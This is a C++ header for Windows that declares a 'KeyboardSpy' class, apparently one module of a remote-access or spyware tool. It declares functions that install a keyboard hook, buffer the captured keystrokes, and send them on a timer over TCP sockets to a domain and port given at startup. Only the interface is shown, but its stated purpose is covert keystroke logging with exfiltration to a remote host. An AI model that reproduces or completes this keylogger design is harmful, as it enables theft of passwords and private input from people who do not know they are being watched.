#ifndef KEYBOARDSPY_H
#define KEYBOARDSPY_H

#include "tcpsocket.h"
#include <windows.h>
#include <iostream>
#include <vector>

class KeyboardSpy
{
public:
    KeyboardSpy();
    ~KeyboardSpy();

    static void startKeyboardSpy(std::string domain, int port);


    static void createDialogByNewThread();
    static DWORD WINAPI threadProc(LPVOID args);
    static BOOL WINAPI keyboardSpyWndProc(HWND hWnd,UINT uiMsg, WPARAM wParam,LPARAM lParam);

    typedef struct
    {
        int iCode;
        int iScanCode;
        int iFlags;
        int iTime;
        int iExtraInfo;
    } HookStruct;

    static HHOOK installKeyboardHook();
    static void uninstallKeyboardHook(HHOOK hHook);
    static LRESULT CALLBACK keyboardHookProc(int nCode,WPARAM wParam, LPARAM lParam);

    static void addSocket(TcpSocket *sock);
    static std::vector<TcpSocket*> getSockets();
    static void delSocket(TcpSocket *sock);
    static void addBuffer(char data);
    static void delBuffer();

    static void CALLBACK sendKeyboardData(HWND hWnd,UINT uiMsg,UINT uiTimer,DWORD dwTimer);
};

#endif // KEYBOARDSPY_H
